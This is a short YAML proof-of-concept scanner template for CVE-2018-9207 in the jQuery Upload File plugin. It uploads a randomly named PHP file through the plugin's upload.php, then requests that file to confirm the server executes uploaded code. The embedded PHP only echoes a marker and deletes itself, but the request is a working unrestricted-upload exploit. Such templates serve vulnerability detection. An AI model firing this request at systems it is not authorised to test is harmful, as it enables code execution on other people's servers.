name: poc-yaml-jquery-cve-2018-9207-fileupload
manual: true
transport: http
set:
    s1: randomLowercase(4)
    s2: randomLowercase(4)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /jquery-upload-file/php/upload.php
            headers:
                Content-Type: multipart/form-data; boundary=------------------------3b760a7588a65d65
            body: "\r\n--------------------------3b760a7588a65d65\r\nContent-Disposition: form-data; name=\"myfile\"; filename=\"{{s1}}.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo \"{{s2}}\"; unlink(__FILE__); ?>\r\n--------------------------3b760a7588a65d65--\r\n"
            follow_redirects: false
        expression: response.status == 200 
        output:
            search: '"(?P<file>[a-z]+.php)".bsubmatch(response.body)'
            file: search["file"]
    r1:
        request:
            cache: true
            method: GET
            path: /jquery-upload-file/php/uploads/{{file}}
        expression: response.status == 200 && response.body.bcontains(bytes(s2))
expression: r0() && r1()
detail:
    author: For3stCo1d (https://github.com/For3stCo1d)
    links:
        - https://cn-sec.com/archives/911387.html
